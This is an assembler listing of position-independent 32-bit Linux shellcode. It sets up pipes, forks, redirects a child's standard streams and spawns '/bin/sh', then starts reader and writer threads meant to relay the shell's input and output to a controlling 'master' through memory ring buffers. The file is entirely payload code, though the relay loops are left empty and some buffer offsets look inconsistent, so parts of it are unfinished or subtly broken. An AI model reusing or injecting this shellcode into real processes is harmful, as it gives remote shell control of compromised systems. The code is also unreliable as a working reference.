     1                                  BITS 32
     2                                  
     3                                  ;		     #   1   2   3   4   5   6
     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
     5                                  ; syscall return: EAX
     6                                  
     7                                  start:
     8 00000000 E800000000              	call near shcode_start
     9                                  shcode_start:
    10 00000005 5D                      	pop	ebp
    11 00000006 81ED[05000000]          	sub	ebp, shcode_start
    12 0000000C 81C5[A3010000]          	add	ebp, data_start
    13                                  
    14                                  	; pipe(m2sh)
    15 00000012 B82A000000              	mov	eax,42
    16 00000017 89EB                    	mov	ebx,ebp
    17 00000019 81C315000000            	add	ebx,m2sh_0
    18 0000001F CD80                    	int	0x80
    19                                  
    20 00000021 3D00000000              	cmp	eax,0
    21 00000026 7526                    	jne	child_dead_interleaved
    22                                  
    23                                  	; pipe(sh2m)
    24 00000028 B82A000000              	mov	eax,42
    25 0000002D 89EB                    	mov	ebx,ebp
    26 0000002F 81C31D000000            	add	ebx,sh2m_0
    27 00000035 CD80                    	int	0x80
    28                                  
    29 00000037 3D00000000              	cmp	eax,0
    30 0000003C 7510                    	jne	child_dead_interleaved
    31                                  
    32                                  	; fork()
    33 0000003E B802000000              	mov	eax,2
    34 00000043 CD80                    	int	0x80
    35                                  
    36 00000045 3D00000000              	cmp	eax,0
    37 0000004A 7407                    	je	child
    38 0000004C 7F6B                    	jg	parent			; signed compare
    39                                  child_dead_interleaved:
    40 0000004E E917010000              	jmp	child_dead
    41                                  
    42                                  child:
    43                                  	; dup2(m2sh[0], 0)   (dup to stdin)
    44 00000053 B83F000000              	mov	eax,63
    45 00000058 89EB                    	mov	ebx,ebp
    46 0000005A 81C315000000            	add	ebx,m2sh_0
    47 00000060 8B1B                    	mov	ebx, [ebx]
    48 00000062 31C9                    	xor	ecx,ecx
    49 00000064 CD80                    	int	0x80
    50                                  
    51 00000066 39C8                    	cmp	eax,ecx
    52 00000068 754A                    	jne	leave_sh_interleaved
    53                                  
    54                                  	; dup2(sh2m[1], 1)   (dup to stdout)
    55 0000006A B83F000000              	mov	eax,63
    56 0000006F 89EB                    	mov	ebx,ebp
    57 00000071 81C321000000            	add	ebx,sh2m_1
    58 00000077 8B1B                    	mov	ebx, [ebx]
    59 00000079 41                      	inc	ecx
    60 0000007A CD80                    	int	0x80
    61                                  
    62 0000007C 39C8                    	cmp	eax,ecx
    63 0000007E 7534                    	jne	leave_sh_interleaved
    64                                  	
    65                                  	; dup2(sh2m[1], 2)   (dup to stderr)
    66 00000080 B83F000000              	mov	eax,63
    67 00000085 89EB                    	mov	ebx,ebp
    68 00000087 81C321000000            	add	ebx,sh2m_1
    69 0000008D 8B1B                    	mov	ebx, [ebx]
    70 0000008F 41                      	inc	ecx
    71 00000090 CD80                    	int	0x80
    72                                  
    73 00000092 39C8                    	cmp	eax,ecx
    74 00000094 751E                    	jne	leave_sh_interleaved
    75                                  
    76                                  	; execve("/bin/sh", ["/bin/sh"], NULL)
    77 00000096 B80B000000              	mov	eax,11
    78 0000009B 89EB                    	mov	ebx,ebp
    79 0000009D 81C3[AC010000]          	add	ebx,execve_command
    80 000000A3 89E9                    	mov	ecx,ebp
    81 000000A5 81C125020000            	add	ecx,foo
    82 000000AB 31D2                    	xor	edx,edx
    83 000000AD 8919                    	mov	[ecx],ebx
    84 000000AF 895104                  	mov	[ecx+4],edx
    85 000000B2 CD80                    	int	0x80
    86                                  
    87                                  	; fail if execve did not work.
    88                                  leave_sh_interleaved:
    89 000000B4 E9E3000000              	jmp	leave_sh
    90                                  
    91                                  parent:
    92                                  	; remember child's PID
    93 000000B9 89EB                    	mov	ebx,ebp
    94 000000BB 81C311000000            	add	ebx,child_pid
    95 000000C1 8903                    	mov	[ebx],eax
    96                                  
    97                                  	; close(m2sh[0])
    98 000000C3 B806000000              	mov	eax,6
    99 000000C8 89EB                    	mov	ebx,ebp
   100 000000CA 81C315000000            	add	ebx,m2sh_0
   101 000000D0 CD80                    	int	0x80
   102                                  
   103                                  	; close(sh2m[1])
   104 000000D2 B806000000              	mov	eax,6
   105 000000D7 89EB                    	mov	ebx,ebp
   106 000000D9 81C321000000            	add	ebx,sh2m_1
   107 000000DF CD80                    	int	0x80
   108                                  
   109                                  	; clone:
   110                                  	; one thread for reader, one thread for writer
   111 000000E1 B878000000              	mov	eax,120
   112                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   113                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   114 000000E6 BB000F0100              	mov	ebx,0x00010f00
   115 000000EB 89E1                    	mov	ecx,esp	; just use same stack. we don't need the stack, anyway.
   116 000000ED 31D2                    	xor	edx,edx
   117 000000EF CD80                    	int	0x80
   118                                  
   119 000000F1 3D00000000              	cmp	eax,0
   120                                  	; ret=0 -> clone
   121 000000F6 7458                    	je	thread_write_to_master	; clone is writer
   122                                  	; ret>0 -> original
   123 000000F8 7F05                    	jg	thread_read_from_master	; original is reader
   124                                  	; error if ret<0
   125 000000FA E96B000000              	jmp	child_dead
   126                                  
   127                                  	; ==================================== the READER thread:
   128                                  thread_read_from_master:
   129                                  	; will write to child via m2sh[1]
   130                                  	; remember RINGBUFFER from_master in esi
   131 000000FF 89EE                    	mov	esi,ebp
   132 00000101 81C625000000            	add	esi,rfrm_buffer
   133                                  
   134                                  reader_while_fds_ok:
   135                                  	; while both FDs are ok:
   136 00000107 8A8503000000            	mov	al,[ebp+to_child_ok]
   137 0000010D 028504000000            	add	al,[ebp+from_child_ok]
   138 00000113 3C02                    	cmp	al,2
   139 00000115 7534                    	jne	leave_sh_second_interleaved
   140                                  
   141                                  	; test, if master requested child to be terminated
   142 00000117 89EB                    	mov	ebx,ebp
   143 00000119 81C302000000            	add	ebx,terminate_child
   144 0000011F 8A03                    	mov	al,[ebx]
   145 00000121 3C00                    	cmp	al,0
   146 00000123 7402                    	je	do_terminate_child
   147                                  
   148                                  
   149                                  
   150                                  
   151                                  
   152                                  
   153 00000125 EBE0                    	jmp	reader_while_fds_ok
   154                                  
   155                                  do_terminate_child:
   156                                  	; send a SIGKILL to child
   157 00000127 B825000000              	mov	eax,37
   158 0000012C 89EB                    	mov	ebx,ebp
   159 0000012E 81C311000000            	add	ebx,child_pid
   160 00000134 8B1B                    	mov	ebx,[ebx]
   161 00000136 B909000000              	mov	ecx,9	; SIGKILL
   162 0000013B CD80                    	int	0x80
   163                                  
   164                                  	; clear to_child_ok
   165 0000013D 31C0                    	xor	eax,eax
   166 0000013F 898503000000            	mov	[ebp+to_child_ok], eax
   167                                  	; and from_child_ok
   168 00000145 898504000000            	mov	[ebp+from_child_ok], eax
   169                                  leave_sh_second_interleaved:
   170 0000014B E94C000000              	jmp	leave_sh
   171                                  
   172                                  	; ==================================== the WRITER thread:
   173                                  thread_write_to_master:
   174                                  	; will read from child via sh2m[0]
   175                                  	; remember RINGBUFFER to_master in esi
   176 00000150 89EE                    	mov	esi,ebp
   177 00000152 81C607000000            	add	esi,rto_writer_pos
   178                                  
   179                                  writer_while_fds_ok:
   180                                  	; while both FDs are ok:
   181 00000158 8A8503000000            	mov	al,[ebp+to_child_ok]
   182 0000015E 028504000000            	add	al,[ebp+from_child_ok]
   183 00000164 3C02                    	cmp	al,2
   184 00000166 7502                    	jne	child_dead
   185                                  
   186                                  
   187                                  
   188                                  
   189                                  
   190                                  
   191 00000168 EBEE                    	jmp	writer_while_fds_ok
   192                                  
   193                                  	; ==================================================================
   194                                  
   195                                  child_dead:
   196                                  	; at most wait 2 seconds for master's ACK
   197 0000016A 31C0                    	xor	eax,eax
   198 0000016C 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   199 00000172 7528                    	jne	leave_sh
   200 00000174 B002                    	mov	al,2
   201 00000176 388500000000            	cmp	[ebp+child_is_dead], al
   202 0000017C 771E                    	ja	leave_sh
   203                                  
   204 0000017E FE4500                  	inc byte [ebp]
   205                                  
   206                                  	; usleep(1,0):
   207 00000181 B8A2000000              	mov	eax, 162
   208 00000186 89EB                    	mov	ebx, ebp
   209 00000188 81C325020000            	add	ebx, foo
   210 0000018E 89D9                    	mov	ecx, ebx
   211 00000190 31D2                    	xor	edx,edx
   212 00000192 895304                  	mov long [ebx+4], edx		; nanoseconds
   213 00000195 42                      	inc	edx
   214 00000196 8913                    	mov long [ebx], edx		; seconds
   215 00000198 CD80                    	int	0x80
   216                                  
   217 0000019A EBCE                    	jmp	child_dead
   218                                  
   219                                  leave_sh:
   220                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   221 0000019C 31DB                    	xor	ebx,ebx
   222 0000019E 89D8                    	mov	eax,ebx
   223 000001A0 40                      	inc	eax
   224 000001A1 CD80                    	int	0x80
   225                                  
   226                                  ; =============================================================================
   227                                  ; DATA
   228                                  data_start EQU $
   229                                  
   230                                  ; do not change order of the following stuff!
   231                                  
   232                                  child_is_dead EQU $ - data_start
   233 000001A3 00                      	db		0
   234                                  child_is_dead_ACK EQU $ - data_start
   235 000001A4 00                      	db		0
   236                                  
   237                                  terminate_child	EQU $ - data_start
   238 000001A5 00                      	db		0
   239                                  
   240                                  to_child_ok EQU $ - data_start
   241 000001A6 01                      	db		1
   242                                  from_child_ok EQU $ - data_start
   243 000001A7 01                      	db		1
   244                                  
   245                                  ; ringbuffer from_master:
   246                                  
   247                                  rfrm_writer_pos EQU $ - data_start
   248 000001A8 00                      	db		0
   249                                  rfrm_reader_pos EQU $ - data_start
   250 000001A9 00                      	db		0
   251                                  
   252                                  ; ringbuffer to_master:
   253                                  
   254                                  rto_writer_pos EQU $ - data_start
   255 000001AA 00                      	db		0
   256                                  rto_reader_pos EQU $ - data_start
   257 000001AB 00                      	db		0
   258                                  
   259 000001AC 2F62696E2F736800        execve_command	db	'/bin/sh',0
   260                                  
   261                                  ; =============================================================================
   262                                  ; stuff that is not required to be initialized:
   263                                  align 4
   264                                  
   265                                  child_pid EQU $ - data_start
   266                                  
   267                                  ; pipes middleman<->shell
   268                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   269                                  m2sh_1 EQU $ - data_start + 8			; master writes
   270                                  sh2m_0 EQU $ - data_start + 12			; master reads
   271                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   272                                  
   273                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   274                                  rto_buffer EQU $ - data_start + 276		; TO master
   275                                  
   276                                  foo EQU $ - data_start + 532
   277                                  bar EQU $ - data_start + 536
   278                                  baz EQU $ - data_start + 540
   279                                  qux EQU $ - data_start + 544
   280                                  
